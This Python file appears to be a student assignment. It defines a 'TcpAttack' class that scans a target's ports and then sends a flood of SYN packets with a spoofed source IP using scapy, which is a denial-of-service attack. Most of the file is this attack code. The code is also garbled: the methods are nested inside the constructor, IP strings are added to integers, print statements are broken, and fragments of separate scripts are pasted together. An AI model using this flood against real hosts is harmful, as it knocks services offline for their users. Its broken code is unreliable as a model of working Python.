import sys, socket
import re
import os.path
from scapy.all import *

class TcpAttack:
    #spoofIP: String containing the IP address to spoof
    #targetIP: String containing the IP address of the target computer to attack
    def __init__(self,spoofIP,targetIP):
        # rangeStart: Integer designating the first port in the range of ports being scanned.
        # rangeEnd: Integer designating the last port in the range of ports being scanned
        # No return value, but writes open ports to openports.txt
        def scanTarget(self, rangeStart, rangeEnd): #his method will scan the target computer for open ports, using the range of ports passed, andwrite  ALL  the  open  ports  found  into  an  output   le  calledopenports.txt.The  format  ofopenports.txtshould be one open port number per line of the  le, in ascending order.
            print("scantarget")
            dst_host = self.spoofIP
            start_port = self.targetIP + rangeStart
            end_port = self.targetIP + rangeStart + rangeEnd  # (4)

            open_ports = []  # (5)
            # Scan the ports in the specified range:
            for testport in range(start_port, end_port + 1):  # (6)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # (7)
                sock.settimeout(0.1)  # (8)
                try:  # (9)
                    sock.connect((dst_host, testport))  # (10)
                    open_ports.append(testport)  # (11)
                    if verbosity: print
                    testport  # (12)
                    sys.stdout.write("%s" % testport)  # (13)
                    sys.stdout.flush()  # (14)
                except:  # (15)
                    if verbosity: print
                    "Port closed: ", testport  # (16)
                    sys.stdout.write(".")  # (17)
                    sys.stdout.flush()  # (18)

            # Now scan through the /etc/services file, if available, so that we can
            # find out what services are provided by the open ports.  The goal here
            # is to construct a dict whose keys are the port names and the values
            # the corresponding lines from the file that are "cleaned up" for
            # getting rid of unwanted white space:
            service_ports = {}
            if os.path.exists("/etc/services"):  # (19)
                IN = open("/etc/services")  # (20)
                for line in IN:  # (21)
                    line = line.strip()  # (22)
                    if line == '': continue  # (23)
                    if (re.match(r'^\s*#', line)): continue  # (24)
                    entries = re.split(r'\s+', line)  # (25)
                    service_ports[entries[1]] = ' '.join(re.split(r'\s+', line))  # (26)
                IN.close()  # (27)

            OUT = open("openports.txt", 'w')  # (28)
            if not open_ports:  # (29)
                print
                "\n\nNo open ports in the range specified\n"  # (30)
            else:
                print
                "\n\nThe open ports:\n\n";  # (31)
                for k in range(0, len(open_ports)):  # (32)
                    if len(service_ports) > 0:  # (33)
                        for portname in sorted(service_ports):  # (34)
                            pattern = r'^' + str(open_ports[k]) + r'/'  # (35)
                            if re.search(pattern, str(portname)):  # (36)
                                print
                                "%d:    %s" % (open_ports[k], service_ports[portname])
                                # (37)
                    else:
                        print
                        open_ports[k]  # (38)
                    OUT.write("%s\n" % open_ports[k])  # (39)
            OUT.close()

            # port: Integer designating the port that the attack will use
        # numSyn: Integer of SYN packets to send to target IP address at the given port
        # If the port is open, perform DoS attack and return 1. Otherwise return 0.
        def attackTarget(self, port, numSyn):
            # For the purpose of this assignment, it is only necessary to send a number of SYN packets equal tonumSyn,  rather than looping infnitely.
            #  You can look at the scripts listed in Section 16.15 of the lecture notes for inspiration
            print("attackTarget")

            dst_host = self.spoofIP
            start_port = self.targetIP + rangeStart
            end_port = self.targetIP + rangeStart + rangeEnd  # (4)

            if len(sys.argv) != 5:
                print
                "Usage>>>:   %s  source_IP  dest_IP  dest_port  how_many_packets" % sys.argv[0]
                sys.exit(1)

            srcIP = sys.argv[1]  # (1)
            destIP = sys.argv[2]  # (2)
            destPort = int(sys.argv[3])  # (3)
            count = int(sys.argv[4])  # (4)

            for i in range(count):  # (5)
                IP_header = IP(src=srcIP, dst=destIP)  # (6)
                TCP_header = TCP(flags="S", sport=RandShort(), dport=destPort)  # (7)
                packet = IP_header / TCP_header  # (8)
                try:  # (9)
                    send(packet)  # (10)
                except Exception as e:  # (11)
                    print
                    e

                # Press the green button in the gutter to run the script.
if __name__ == '__main__':
    #if len(sys.argv) != 4:
    #    sys.exit("Usage: 'port_scan.py  host  start_port  end_port where \n host is the symbolic hostname or the IP address nof the machine whose ports you want to scan, start_port is start_port is the starting port number and end_port is the \nending port number")

    verbosity = 0;  # set it to 1 if you want to see the result for each   #(1)
    # port separately as the scan is taking place


    spoofIP = '10.1.1.1'; targetIP = '10.1.1.2'  # Will contain actual IP addresses in real
    rangeStart = 0
    rangeEnd = 1
    port = 10
    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(rangeStart, rangeEnd)
    if Tcp.attackTarget(port, 10): print('port was open to attack')

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
